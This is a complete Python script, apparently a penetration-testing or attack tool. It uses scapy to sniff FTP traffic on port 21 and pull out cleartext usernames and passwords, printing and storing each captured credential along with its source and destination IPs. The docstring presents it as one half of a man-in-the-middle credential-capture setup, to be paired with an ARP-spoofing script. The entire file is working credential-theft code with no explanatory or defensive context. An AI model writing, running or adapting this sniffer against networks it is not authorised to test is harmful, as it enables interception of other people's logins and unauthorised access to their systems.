#!/usr/bin/env python3
"""
ftp_sniffer.py — Captures FTP credentials from intercepted traffic.
Combine with arp_spoof.py for full MitM credential capture.
"""

from scapy.all import IP, TCP, Raw, sniff
import re

CAPTURED_CREDS = []

def extract_ftp(pkt):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    payload = pkt[Raw].load.decode("utf-8", errors="ignore").strip()
    src_ip  = pkt[IP].src
    dst_ip  = pkt[IP].dst

    # FTP control channel is port 21
    if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
        if payload.upper().startswith("USER"):
            username = payload.split(" ", 1)[1] if " " in payload else "?"
            print(f"\033[92m[FTP] User from {src_ip}: {username}\033[0m")
            CAPTURED_CREDS.append({"type": "username", "value": username,
                                   "src": src_ip, "dst": dst_ip})

        elif payload.upper().startswith("PASS"):
            password = payload.split(" ", 1)[1] if " " in payload else "?"
            print(f"\033[91m[FTP] Password from {src_ip}: {password}\033[0m")
            CAPTURED_CREDS.append({"type": "password", "value": password,
                                   "src": src_ip, "dst": dst_ip})

        elif payload.startswith("2") or payload.startswith("3"):
            # FTP server responses
            print(f"\033[94m[FTP Server {src_ip}] {payload[:80]}\033[0m")

print("[*] FTP sniffer active. Waiting for credentials...\n")
sniff(filter="tcp port 21", prn=extract_ftp, store=False)